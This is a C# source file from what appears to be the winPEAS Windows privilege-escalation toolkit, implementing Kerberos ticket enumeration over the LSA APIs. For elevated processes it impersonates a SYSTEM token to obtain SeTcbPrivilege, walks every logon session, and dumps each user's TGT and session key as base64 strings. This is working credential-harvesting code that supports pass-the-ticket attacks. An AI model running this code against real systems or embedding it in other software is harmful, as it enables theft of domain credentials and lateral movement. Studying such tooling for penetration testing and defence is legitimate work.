using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using winPEAS.Helpers;
using winPEAS.Native;
using winPEAS.Native.Enums;

namespace winPEAS.KnownFileCreds.Kerberos
{
    static class Kerberos
    {
        public static List<Dictionary<string, string>> ListKerberosTickets()
        {
            if (MyUtils.IsHighIntegrity())
            {
                return ListKerberosTicketsAllUsers();
            }
            else
            {
                return ListKerberosTicketsCurrentUser();
            }
        }

        public static List<Dictionary<string, string>> ListKerberosTicketsAllUsers()
        {
            List<Dictionary<string, string>> results = new List<Dictionary<string, string>>();
            // adapted partially from Vincent LE TOUX' work
            //      https://github.com/vletoux/MakeMeEnterpriseAdmin/blob/master/MakeMeEnterpriseAdmin.ps1#L2939-L2950
            // and https://www.dreamincode.net/forums/topic/135033-increment-memory-pointer-issue/
            // also Jared Atkinson's work at https://github.com/Invoke-IR/ACE/blob/master/ACE-Management/PS-ACE/Scripts/ACE_Get-KerberosTicketCache.ps1

            IntPtr hLsa = Helpers.LsaRegisterLogonProcessHelper();
            int totalTicketCount = 0;

            // if the original call fails then it is likely we don't have SeTcbPrivilege
            // to get SeTcbPrivilege we can Impersonate a NT AUTHORITY\SYSTEM Token
            if (hLsa == IntPtr.Zero)
            {
                Helpers.GetSystem();
                // should now have the proper privileges to get a Handle to LSA
                hLsa = Helpers.LsaRegisterLogonProcessHelper();
                // we don't need our NT AUTHORITY\SYSTEM Token anymore so we can revert to our original token
                Advapi32.RevertToSelf();
            }

            try
            {
                // first return all the logon sessions

                DateTime systime = new DateTime(1601, 1, 1, 0, 0, 0, 0); //win32 systemdate
                UInt64 count;
                IntPtr luidPtr = IntPtr.Zero;
                IntPtr iter = luidPtr;

                uint ret = Secur32.LsaEnumerateLogonSessions(out count, out luidPtr);  // get an array of pointers to LUIDs

                for (ulong i = 0; i < count; i++)
                {
                    IntPtr sessionData;
                    ret = Secur32.LsaGetLogonSessionData(luidPtr, out sessionData);
                    SECURITY_LOGON_SESSION_DATA data = (SECURITY_LOGON_SESSION_DATA)Marshal.PtrToStructure(sessionData, typeof(SECURITY_LOGON_SESSION_DATA));

                    // if we have a valid logon
                    if (data.PSiD != IntPtr.Zero)
                    {
                        // user session data
                        string username = Marshal.PtrToStringUni(data.Username.Buffer).Trim();
                        System.Security.Principal.SecurityIdentifier sid = new System.Security.Principal.SecurityIdentifier(data.PSiD);
                        string domain = Marshal.PtrToStringUni(data.LoginDomain.Buffer).Trim();
                        string authpackage = Marshal.PtrToStringUni(data.AuthenticationPackage.Buffer).Trim();
                        SECURITY_LOGON_TYPE logonType = (SECURITY_LOGON_TYPE)data.LogonType;
                        DateTime logonTime = systime.AddTicks((long)data.LoginTime);
                        string logonServer = Marshal.PtrToStringUni(data.LogonServer.Buffer).Trim();
                        string dnsDomainName = Marshal.PtrToStringUni(data.DnsDomainName.Buffer).Trim();
                        string upn = Marshal.PtrToStringUni(data.Upn.Buffer).Trim();

                        // now we want to get the tickets for this logon ID
                        string name = "kerberos";
                        LSA_STRING_IN LSAString;
                        LSAString.Length = (ushort)name.Length;
                        LSAString.MaximumLength = (ushort)(name.Length + 1);
                        LSAString.Buffer = name;

                        IntPtr ticketPointer = IntPtr.Zero;
                        IntPtr ticketsPointer = IntPtr.Zero;
                        DateTime sysTime = new DateTime(1601, 1, 1, 0, 0, 0, 0);
                        int authPack;
                        int returnBufferLength = 0;
                        int protocalStatus = 0;
                        int retCode;

                        KERB_QUERY_TKT_CACHE_REQUEST tQuery = new KERB_QUERY_TKT_CACHE_REQUEST();
                        KERB_QUERY_TKT_CACHE_RESPONSE tickets = new KERB_QUERY_TKT_CACHE_RESPONSE();
                        KERB_TICKET_CACHE_INFO ticket;

                        // obtains the unique identifier for the kerberos authentication package.
                        retCode = Secur32.LsaLookupAuthenticationPackage(hLsa, ref LSAString, out authPack);

                        // input object for querying the ticket cache for a specific logon ID
                        LUID userLogonID = new LUID();
                        userLogonID.LowPart = data.LoginID.LowPart;
                        userLogonID.HighPart = 0;
                        tQuery.LogonId = userLogonID;
                        tQuery.MessageType = KERB_PROTOCOL_MESSAGE_TYPE.KerbQueryTicketCacheMessage;

                        // query LSA, specifying we want the ticket cache
                        retCode = Secur32.LsaCallAuthenticationPackage(hLsa, authPack, ref tQuery, Marshal.SizeOf(tQuery), out ticketPointer, out returnBufferLength, out protocalStatus);

                        /*Console.WriteLine("\r\n  UserName                 : {0}", username);
                        Console.WriteLine("  Domain                   : {0}", domain);
                        Console.WriteLine("  LogonId                  : {0}", data.LoginID.LowPart);
                        Console.WriteLine("  UserSID                  : {0}", sid.AccountDomainSid);
                        Console.WriteLine("  AuthenticationPackage    : {0}", authpackage);
                        Console.WriteLine("  LogonType                : {0}", logonType);
                        Console.WriteLine("  LogonType                : {0}", logonTime);
                        Console.WriteLine("  LogonServer              : {0}", logonServer);
                        Console.WriteLine("  LogonServerDNSDomain     : {0}", dnsDomainName);
                        Console.WriteLine("  UserPrincipalName        : {0}\r\n", upn);*/

                        if (ticketPointer != IntPtr.Zero)
                        {
                            // parse the returned pointer into our initial KERB_QUERY_TKT_CACHE_RESPONSE structure
                            tickets = (KERB_QUERY_TKT_CACHE_RESPONSE)Marshal.PtrToStructure((System.IntPtr)ticketPointer, typeof(KERB_QUERY_TKT_CACHE_RESPONSE));
                            int count2 = tickets.CountOfTickets;

                            if (count2 != 0)
                            {
                                Console.WriteLine("    [*] Enumerated {0} ticket(s):\r\n", count2);
                                totalTicketCount += count2;
                                // get the size of the structures we're iterating over
                                Int32 dataSize = Marshal.SizeOf(typeof(KERB_TICKET_CACHE_INFO));

                                for (int j = 0; j < count2; j++)
                                {
                                    // iterate through the structures
                                    IntPtr currTicketPtr = (IntPtr)(long)((ticketPointer.ToInt64() + (int)(8 + j * dataSize)));

                                    // parse the new ptr to the appropriate structure
                                    ticket = (KERB_TICKET_CACHE_INFO)Marshal.PtrToStructure(currTicketPtr, typeof(KERB_TICKET_CACHE_INFO));

                                    // extract our fields
                                    string serverName = Marshal.PtrToStringUni(ticket.ServerName.Buffer, ticket.ServerName.Length / 2);
                                    string realmName = Marshal.PtrToStringUni(ticket.RealmName.Buffer, ticket.RealmName.Length / 2);
                                    DateTime startTime = DateTime.FromFileTime(ticket.StartTime);
                                    DateTime endTime = DateTime.FromFileTime(ticket.EndTime);
                                    DateTime renewTime = DateTime.FromFileTime(ticket.RenewTime);
                                    string encryptionType = ((KERB_ENCRYPTION_TYPE)ticket.EncryptionType).ToString();
                                    string ticketFlags = ((KERB_TICKET_FLAGS)ticket.TicketFlags).ToString();

                                    results.Add(new Dictionary<string, string>()
                                    {
                                        { "UserPrincipalName", upn },
                                        { "serverName", serverName },
                                        { "RealmName", realmName },
                                        { "StartTime", string.Format("{0}", startTime) },
                                        { "EndTime", string.Format("{0}", endTime) },
                                        { "RenewTime", string.Format("{0}", renewTime) },
                                        { "EncryptionType", encryptionType },
                                        { "TicketFlags", ticketFlags },
                                    });
                                }
                            }
                        }
                    }
                    // move the pointer forward
                    luidPtr = (IntPtr)((long)luidPtr.ToInt64() + Marshal.SizeOf(typeof(LUID)));
                    Secur32.LsaFreeReturnBuffer(sessionData);
                }
                Secur32.LsaFreeReturnBuffer(luidPtr);

                // disconnect from LSA
                Secur32.LsaDeregisterLogonProcess(hLsa);
            }
            catch (Exception ex)
            {
                Beaprint.PrintException(ex.Message);
            }
            return results;
        }

        public static List<Dictionary<string, string>> ListKerberosTicketsCurrentUser()
        {
            List<Dictionary<string, string>> results = new List<Dictionary<string, string>>();
            // adapted partially from Vincent LE TOUX' work
            //      https://github.com/vletoux/MakeMeEnterpriseAdmin/blob/master/MakeMeEnterpriseAdmin.ps1#L2939-L2950
            // and https://www.dreamincode.net/forums/topic/135033-increment-memory-pointer-issue/
            // also Jared Atkinson's work at https://github.com/Invoke-IR/ACE/blob/master/ACE-Management/PS-ACE/Scripts/ACE_Get-KerberosTicketCache.ps1

            try
            {
                string name = "kerberos";
                LSA_STRING_IN LSAString;
                LSAString.Length = (ushort)name.Length;
                LSAString.MaximumLength = (ushort)(name.Length + 1);
                LSAString.Buffer = name;

                IntPtr ticketPointer = IntPtr.Zero;
                IntPtr ticketsPointer = IntPtr.Zero;
                DateTime sysTime = new DateTime(1601, 1, 1, 0, 0, 0, 0);
                int authPack;
                int returnBufferLength = 0;
                int protocalStatus = 0;
                IntPtr lsaHandle;
                int retCode;

                // If we want to look at tickets from a session other than our own
                // then we need to use LsaRegisterLogonProcess instead of LsaConnectUntrusted
                retCode = Secur32.LsaConnectUntrusted(out lsaHandle);

                KERB_QUERY_TKT_CACHE_REQUEST tQuery = new KERB_QUERY_TKT_CACHE_REQUEST();
                KERB_QUERY_TKT_CACHE_RESPONSE tickets = new KERB_QUERY_TKT_CACHE_RESPONSE();
                KERB_TICKET_CACHE_INFO ticket;

                // obtains the unique identifier for the kerberos authentication package.
                retCode = Secur32.LsaLookupAuthenticationPackage(lsaHandle, ref LSAString, out authPack);

                // input object for querying the ticket cache (https://docs.microsoft.com/en-us/windows/desktop/api/ntsecapi/ns-ntsecapi-_kerb_query_tkt_cache_request)
                tQuery.LogonId = new LUID();
                tQuery.MessageType = KERB_PROTOCOL_MESSAGE_TYPE.KerbQueryTicketCacheMessage;

                // query LSA, specifying we want the ticket cache
                retCode = Secur32.LsaCallAuthenticationPackage(lsaHandle, authPack, ref tQuery, Marshal.SizeOf(tQuery), out ticketPointer, out returnBufferLength, out protocalStatus);

                // parse the returned pointer into our initial KERB_QUERY_TKT_CACHE_RESPONSE structure
                tickets = (KERB_QUERY_TKT_CACHE_RESPONSE)Marshal.PtrToStructure((System.IntPtr)ticketPointer, typeof(KERB_QUERY_TKT_CACHE_RESPONSE));
                int count = tickets.CountOfTickets;

                // get the size of the structures we're iterating over
                Int32 dataSize = Marshal.SizeOf(typeof(KERB_TICKET_CACHE_INFO));

                for (int i = 0; i < count; i++)
                {
                    // iterate through the structures
                    IntPtr currTicketPtr = (IntPtr)(long)((ticketPointer.ToInt64() + (int)(8 + i * dataSize)));

                    // parse the new ptr to the appropriate structure
                    ticket = (KERB_TICKET_CACHE_INFO)Marshal.PtrToStructure(currTicketPtr, typeof(KERB_TICKET_CACHE_INFO));

                    // extract our fields
                    string serverName = Marshal.PtrToStringUni(ticket.ServerName.Buffer, ticket.ServerName.Length / 2);
                    string realmName = Marshal.PtrToStringUni(ticket.RealmName.Buffer, ticket.RealmName.Length / 2);
                    DateTime startTime = DateTime.FromFileTime(ticket.StartTime);
                    DateTime endTime = DateTime.FromFileTime(ticket.EndTime);
                    DateTime renewTime = DateTime.FromFileTime(ticket.RenewTime);
                    string encryptionType = ((KERB_ENCRYPTION_TYPE)ticket.EncryptionType).ToString();
                    string ticketFlags = ((KERB_TICKET_FLAGS)ticket.TicketFlags).ToString();

                    results.Add(new Dictionary<string, string>()
                                    {
                                        { "serverName", serverName },
                                        { "RealmName", realmName },
                                        { "StartTime", string.Format("{0}", startTime) },
                                        { "EndTime", string.Format("{0}", endTime) },
                                        { "RenewTime", string.Format("{0}", renewTime) },
                                        { "EncryptionType", encryptionType },
                                        { "TicketFlags", ticketFlags },
                                    });
                }

                // disconnect from LSA
                Secur32.LsaDeregisterLogonProcess(lsaHandle);
            }
            catch (Exception ex)
            {
                Beaprint.PrintException(ex.Message);
            }
            return results;
        }

        public static List<Dictionary<string, string>> GetKerberosTGTData()
        {
            if (MyUtils.IsHighIntegrity())
            {
                return ListKerberosTGTDataAllUsers();
            }
            else
            {
                return ListKerberosTGTDataCurrentUser();
            }
        }

        public static List<Dictionary<string, string>> ListKerberosTGTDataAllUsers()
        {
            List<Dictionary<string, string>> results = new List<Dictionary<string, string>>();
            // adapted partially from Vincent LE TOUX' work
            //      https://github.com/vletoux/MakeMeEnterpriseAdmin/blob/master/MakeMeEnterpriseAdmin.ps1#L2939-L2950
            // and https://www.dreamincode.net/forums/topic/135033-increment-memory-pointer-issue/
            // also Jared Atkinson's work at https://github.com/Invoke-IR/ACE/blob/master/ACE-Management/PS-ACE/Scripts/ACE_Get-KerberosTicketCache.ps1

            IntPtr hLsa = Helpers.LsaRegisterLogonProcessHelper();
            int totalTicketCount = 0;

            // if the original call fails then it is likely we don't have SeTcbPrivilege
            // to get SeTcbPrivilege we can Impersonate a NT AUTHORITY\SYSTEM Token
            if (hLsa == IntPtr.Zero)
            {
                Helpers.GetSystem();
                // should now have the proper privileges to get a Handle to LSA
                hLsa = Helpers.LsaRegisterLogonProcessHelper();
                // we don't need our NT AUTHORITY\SYSTEM Token anymore so we can revert to our original token
                Advapi32.RevertToSelf();
            }

            try
            {
                // first return all the logon sessions

                DateTime systime = new DateTime(1601, 1, 1, 0, 0, 0, 0); //win32 systemdate
                UInt64 count;
                IntPtr luidPtr = IntPtr.Zero;
                IntPtr iter = luidPtr;

                uint ret = Secur32.LsaEnumerateLogonSessions(out count, out luidPtr);  // get an array of pointers to LUIDs

                for (ulong i = 0; i < count; i++)
                {
                    IntPtr sessionData;
                    ret = Secur32.LsaGetLogonSessionData(luidPtr, out sessionData);
                    SECURITY_LOGON_SESSION_DATA data = (SECURITY_LOGON_SESSION_DATA)Marshal.PtrToStructure(sessionData, typeof(SECURITY_LOGON_SESSION_DATA));

                    // if we have a valid logon
                    if (data.PSiD != IntPtr.Zero)
                    {
                        // user session data
                        string username = Marshal.PtrToStringUni(data.Username.Buffer).Trim();
                        System.Security.Principal.SecurityIdentifier sid = new System.Security.Principal.SecurityIdentifier(data.PSiD);
                        string domain = Marshal.PtrToStringUni(data.LoginDomain.Buffer).Trim();
                        string authpackage = Marshal.PtrToStringUni(data.AuthenticationPackage.Buffer).Trim();
                        SECURITY_LOGON_TYPE logonType = (SECURITY_LOGON_TYPE)data.LogonType;
                        DateTime logonTime = systime.AddTicks((long)data.LoginTime);
                        string logonServer = Marshal.PtrToStringUni(data.LogonServer.Buffer).Trim();
                        string dnsDomainName = Marshal.PtrToStringUni(data.DnsDomainName.Buffer).Trim();
                        string upn = Marshal.PtrToStringUni(data.Upn.Buffer).Trim();

                        // now we want to get the tickets for this logon ID
                        string name = "kerberos";
                        LSA_STRING_IN LSAString;
                        LSAString.Length = (ushort)name.Length;
                        LSAString.MaximumLength = (ushort)(name.Length + 1);
                        LSAString.Buffer = name;

                        IntPtr responsePointer = IntPtr.Zero;
                        int authPack;
                        int returnBufferLength = 0;
                        int protocalStatus = 0;
                        int retCode;

                        KERB_RETRIEVE_TKT_REQUEST tQuery = new KERB_RETRIEVE_TKT_REQUEST();
                        KERB_RETRIEVE_TKT_RESPONSE response = new KERB_RETRIEVE_TKT_RESPONSE();

                        // obtains the unique identifier for the kerberos authentication package.
                        retCode = Secur32.LsaLookupAuthenticationPackage(hLsa, ref LSAString, out authPack);

                        // input object for querying the TGT for a specific logon ID (https://docs.microsoft.com/en-us/windows/desktop/api/ntsecapi/ns-ntsecapi-_kerb_retrieve_tkt_request)
                        LUID userLogonID = new LUID();
                        userLogonID.LowPart = data.LoginID.LowPart;
                        userLogonID.HighPart = 0;
                        tQuery.LogonId = userLogonID;
                        tQuery.MessageType = KERB_PROTOCOL_MESSAGE_TYPE.KerbRetrieveTicketMessage;
                        // indicate we want kerb creds yo'
                        tQuery.CacheOptions = KERB_CACHE_OPTIONS.KERB_RETRIEVE_TICKET_AS_KERB_CRED;

                        // query LSA, specifying we want the the TGT data
                        retCode = Secur32.LsaCallAuthenticationPackage_KERB_RETRIEVE_TKT(hLsa, authPack, ref tQuery, Marshal.SizeOf(tQuery), out responsePointer, out returnBufferLength, out protocalStatus);

                        if ((retCode) == 0 && (responsePointer != IntPtr.Zero))
                        {
                            /*Console.WriteLine("\r\n  UserName                 : {0}", username);
                            Console.WriteLine("  Domain                   : {0}", domain);
                            Console.WriteLine("  LogonId                  : {0}", data.LoginID.LowPart);
                            Console.WriteLine("  UserSID                  : {0}", sid.AccountDomainSid);
                            Console.WriteLine("  AuthenticationPackage    : {0}", authpackage);
                            Console.WriteLine("  LogonType                : {0}", logonType);
                            Console.WriteLine("  LogonType                : {0}", logonTime);
                            Console.WriteLine("  LogonServer              : {0}", logonServer);
                            Console.WriteLine("  LogonServerDNSDomain     : {0}", dnsDomainName);
                            Console.WriteLine("  UserPrincipalName        : {0}", upn);*/

                            // parse the returned pointer into our initial KERB_RETRIEVE_TKT_RESPONSE structure
                            response = (KERB_RETRIEVE_TKT_RESPONSE)Marshal.PtrToStructure((System.IntPtr)responsePointer, typeof(KERB_RETRIEVE_TKT_RESPONSE));

                            KERB_EXTERNAL_NAME serviceNameStruct = (KERB_EXTERNAL_NAME)Marshal.PtrToStructure(response.Ticket.ServiceName, typeof(KERB_EXTERNAL_NAME));
                            string serviceName = Marshal.PtrToStringUni(serviceNameStruct.Names.Buffer, serviceNameStruct.Names.Length / 2).Trim();

                            string targetName = "";
                            if (response.Ticket.TargetName != IntPtr.Zero)
                            {
                                KERB_EXTERNAL_NAME targetNameStruct = (KERB_EXTERNAL_NAME)Marshal.PtrToStructure(response.Ticket.TargetName, typeof(KERB_EXTERNAL_NAME));
                                targetName = Marshal.PtrToStringUni(targetNameStruct.Names.Buffer, targetNameStruct.Names.Length / 2).Trim();
                            }

                            KERB_EXTERNAL_NAME clientNameStruct = (KERB_EXTERNAL_NAME)Marshal.PtrToStructure(response.Ticket.ClientName, typeof(KERB_EXTERNAL_NAME));
                            string clientName = Marshal.PtrToStringUni(clientNameStruct.Names.Buffer, clientNameStruct.Names.Length / 2).Trim();

                            string domainName = Marshal.PtrToStringUni(response.Ticket.DomainName.Buffer, response.Ticket.DomainName.Length / 2).Trim();
                            string targetDomainName = Marshal.PtrToStringUni(response.Ticket.TargetDomainName.Buffer, response.Ticket.TargetDomainName.Length / 2).Trim();
                            string altTargetDomainName = Marshal.PtrToStringUni(response.Ticket.AltTargetDomainName.Buffer, response.Ticket.AltTargetDomainName.Length / 2).Trim();

                            // extract the session key
                            KERB_ENCRYPTION_TYPE sessionKeyType = (KERB_ENCRYPTION_TYPE)response.Ticket.SessionKey.KeyType;
                            Int32 sessionKeyLength = response.Ticket.SessionKey.Length;
                            byte[] sessionKey = new byte[sessionKeyLength];
                            Marshal.Copy(response.Ticket.SessionKey.Value, sessionKey, 0, sessionKeyLength);
                            string base64SessionKey = Convert.ToBase64String(sessionKey);

                            DateTime keyExpirationTime = DateTime.FromFileTime(response.Ticket.KeyExpirationTime);
                            DateTime startTime = DateTime.FromFileTime(response.Ticket.StartTime);
                            DateTime endTime = DateTime.FromFileTime(response.Ticket.EndTime);
                            DateTime renewUntil = DateTime.FromFileTime(response.Ticket.RenewUntil);
                            Int64 timeSkew = response.Ticket.TimeSkew;
                            Int32 encodedTicketSize = response.Ticket.EncodedTicketSize;

                            string ticketFlags = ((KERB_TICKET_FLAGS)response.Ticket.TicketFlags).ToString();

                            // extract the TGT and base64 encode it
                            byte[] encodedTicket = new byte[encodedTicketSize];
                            Marshal.Copy(response.Ticket.EncodedTicket, encodedTicket, 0, encodedTicketSize);
                            string base64TGT = Convert.ToBase64String(encodedTicket);

                            results.Add(new Dictionary<string, string>()
                            {
                                { "UserPrincipalName", upn },
                                { "ServiceName", serviceName },
                                { "TargetName", targetName },
                                { "ClientName", clientName },
                                { "DomainName", domainName },
                                { "TargetDomainName", targetDomainName },
                                { "SessionKeyType", string.Format("{0}", sessionKeyType) },
                                { "Base64SessionKey", base64SessionKey },
                                { "KeyExpirationTime", string.Format("{0}", keyExpirationTime) },
                                { "TicketFlags", ticketFlags },
                                { "StartTime", string.Format("{0}", startTime) },
                                { "EndTime", string.Format("{0}", endTime) },
                                { "RenewUntil", string.Format("{0}", renewUntil) },
                                { "TimeSkew", string.Format("{0}", timeSkew) },
                                { "EncodedTicketSize", string.Format("{0}", encodedTicketSize) },
                                { "Base64EncodedTicket", base64TGT },
                            });
                            totalTicketCount++;
                        }
                    }
                    luidPtr = (IntPtr)((long)luidPtr.ToInt64() + Marshal.SizeOf(typeof(LUID)));
                    //move the pointer forward
                    Secur32.LsaFreeReturnBuffer(sessionData);
                    //free the SECURITY_LOGON_SESSION_DATA memory in the struct
                }
                Secur32.LsaFreeReturnBuffer(luidPtr);       //free the array of LUIDs

                // disconnect from LSA
                Secur32.LsaDeregisterLogonProcess(hLsa);
            }
            catch (Exception ex)
            {
                Beaprint.PrintException(ex.Message);
            }
            return results;
        }
        public static List<Dictionary<string, string>> ListKerberosTGTDataCurrentUser()
        {
            List<Dictionary<string, string>> results = new List<Dictionary<string, string>>();
            // adapted partially from Vincent LE TOUX' work
            //      https://github.com/vletoux/MakeMeEnterpriseAdmin/blob/master/MakeMeEnterpriseAdmin.ps1#L2939-L2950
            // and https://www.dreamincode.net/forums/topic/135033-increment-memory-pointer-issue/
            // also Jared Atkinson's work at https://github.com/Invoke-IR/ACE/blob/master/ACE-Management/PS-ACE/Scripts/ACE_Get-KerberosTicketCache.ps1

            try
            {
                string name = "kerberos";
                LSA_STRING_IN LSAString;
                LSAString.Length = (ushort)name.Length;
                LSAString.MaximumLength = (ushort)(name.Length + 1);
                LSAString.Buffer = name;

                IntPtr responsePointer = IntPtr.Zero;
                int authPack;
                int returnBufferLength = 0;
                int protocalStatus = 0;
                IntPtr lsaHandle;
                int retCode;

                // If we want to look at tickets from a session other than our own
                // then we need to use LsaRegisterLogonProcess instead of LsaConnectUntrusted
                retCode = Secur32.LsaConnectUntrusted(out lsaHandle);

                KERB_RETRIEVE_TKT_REQUEST tQuery = new KERB_RETRIEVE_TKT_REQUEST();
                KERB_RETRIEVE_TKT_RESPONSE response = new KERB_RETRIEVE_TKT_RESPONSE();

                // obtains the unique identifier for the kerberos authentication package.
                retCode = Secur32.LsaLookupAuthenticationPackage(lsaHandle, ref LSAString, out authPack);

                // input object for querying the TGT (https://docs.microsoft.com/en-us/windows/desktop/api/ntsecapi/ns-ntsecapi-_kerb_retrieve_tkt_request)
                tQuery.LogonId = new LUID();
                tQuery.MessageType = KERB_PROTOCOL_MESSAGE_TYPE.KerbRetrieveTicketMessage;
                // indicate we want kerb creds yo'
                //tQuery.CacheOptions = KERB_CACHE_OPTIONS.KERB_RETRIEVE_TICKET_AS_KERB_CRED;

                // query LSA, specifying we want the the TGT data
                retCode = Secur32.LsaCallAuthenticationPackage_KERB_RETRIEVE_TKT(lsaHandle, authPack, ref tQuery, Marshal.SizeOf(tQuery), out responsePointer, out returnBufferLength, out protocalStatus);

                // parse the returned pointer into our initial KERB_RETRIEVE_TKT_RESPONSE structure
                response = (KERB_RETRIEVE_TKT_RESPONSE)Marshal.PtrToStructure((System.IntPtr)responsePointer, typeof(KERB_RETRIEVE_TKT_RESPONSE));

                KERB_EXTERNAL_NAME serviceNameStruct = (KERB_EXTERNAL_NAME)Marshal.PtrToStructure(response.Ticket.ServiceName, typeof(KERB_EXTERNAL_NAME));
                string serviceName = Marshal.PtrToStringUni(serviceNameStruct.Names.Buffer, serviceNameStruct.Names.Length / 2).Trim();

                string targetName = "";
                if (response.Ticket.TargetName != IntPtr.Zero)
                {
                    KERB_EXTERNAL_NAME targetNameStruct = (KERB_EXTERNAL_NAME)Marshal.PtrToStructure(response.Ticket.TargetName, typeof(KERB_EXTERNAL_NAME));
                    targetName = Marshal.PtrToStringUni(targetNameStruct.Names.Buffer, targetNameStruct.Names.Length / 2).Trim();
                }

                KERB_EXTERNAL_NAME clientNameStruct = (KERB_EXTERNAL_NAME)Marshal.PtrToStructure(response.Ticket.ClientName, typeof(KERB_EXTERNAL_NAME));
                string clientName = Marshal.PtrToStringUni(clientNameStruct.Names.Buffer, clientNameStruct.Names.Length / 2).Trim();

                string domainName = Marshal.PtrToStringUni(response.Ticket.DomainName.Buffer, response.Ticket.DomainName.Length / 2).Trim();
                string targetDomainName = Marshal.PtrToStringUni(response.Ticket.TargetDomainName.Buffer, response.Ticket.TargetDomainName.Length / 2).Trim();
                string altTargetDomainName = Marshal.PtrToStringUni(response.Ticket.AltTargetDomainName.Buffer, response.Ticket.AltTargetDomainName.Length / 2).Trim();

                // extract the session key
                KERB_ENCRYPTION_TYPE sessionKeyType = (KERB_ENCRYPTION_TYPE)response.Ticket.SessionKey.KeyType;
                Int32 sessionKeyLength = response.Ticket.SessionKey.Length;
                byte[] sessionKey = new byte[sessionKeyLength];
                Marshal.Copy(response.Ticket.SessionKey.Value, sessionKey, 0, sessionKeyLength);
                string base64SessionKey = Convert.ToBase64String(sessionKey);

                DateTime keyExpirationTime = DateTime.FromFileTime(response.Ticket.KeyExpirationTime);
                DateTime startTime = DateTime.FromFileTime(response.Ticket.StartTime);
                DateTime endTime = DateTime.FromFileTime(response.Ticket.EndTime);
                DateTime renewUntil = DateTime.FromFileTime(response.Ticket.RenewUntil);
                Int64 timeSkew = response.Ticket.TimeSkew;
                Int32 encodedTicketSize = response.Ticket.EncodedTicketSize;

                string ticketFlags = ((KERB_TICKET_FLAGS)response.Ticket.TicketFlags).ToString();

                // extract the TGT and base64 encode it
                byte[] encodedTicket = new byte[encodedTicketSize];
                Marshal.Copy(response.Ticket.EncodedTicket, encodedTicket, 0, encodedTicketSize);
                string base64TGT = Convert.ToBase64String(encodedTicket);

                results.Add(new Dictionary<string, string>()
                {
                    { "ServiceName", serviceName },
                    { "TargetName", targetName },
                    { "ClientName", clientName },
                    { "DomainName", domainName },
                    { "TargetDomainName", targetDomainName },
                    { "SessionKeyType", string.Format("{0}", sessionKeyType) },
                    { "Base64SessionKey", base64SessionKey },
                    { "KeyExpirationTime", string.Format("{0}", keyExpirationTime) },
                    { "TicketFlags", ticketFlags },
                    { "StartTime", string.Format("{0}", startTime) },
                    { "EndTime", string.Format("{0}", endTime) },
                    { "RenewUntil", string.Format("{0}", renewUntil) },
                    { "TimeSkew", string.Format("{0}", timeSkew) },
                    { "EncodedTicketSize", string.Format("{0}", encodedTicketSize) },
                    { "Base64EncodedTicket", base64TGT },
                });

                // disconnect from LSA
                Secur32.LsaDeregisterLogonProcess(lsaHandle);
            }
            catch (Exception ex)
            {
                Beaprint.PrintException(ex.Message);
            }
            return results;
        }
    }
}
